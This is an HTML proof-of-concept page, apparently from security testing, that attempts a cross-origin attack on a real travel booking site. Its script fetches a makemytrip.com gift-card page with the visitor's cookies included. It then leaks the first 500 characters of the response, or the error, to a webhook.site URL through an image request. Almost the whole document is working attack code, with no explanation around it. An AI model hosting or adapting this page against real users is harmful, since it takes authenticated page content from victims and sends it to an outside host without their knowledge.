<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Preflight-Free CORS PoC</title>
</head>
<body>
<script>
// Preflight-free attempt (GET request, no headers)
fetch('https://www.makemytrip.com/gift-cards/corporate-gift-vouchers/', {
  method: 'GET',
  credentials: 'include' // will still work if no preflight is triggered
})
.then(r => r.text())
.then(body => {
  // Leak via GET (avoids preflight on webhook)
  const img = new Image();
  img.src = 'https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8?leak=' + encodeURIComponent(body.slice(0, 500));
  document.body.appendChild(img);
})
.catch(err => {
  const img = new Image();
  img.src = 'https://webhook.site/de27185c-3af2-4bcd-8144-dee66cf296f8?error=' + encodeURIComponent(err);
  document.body.appendChild(img);
});
</script>
</body>
</html>
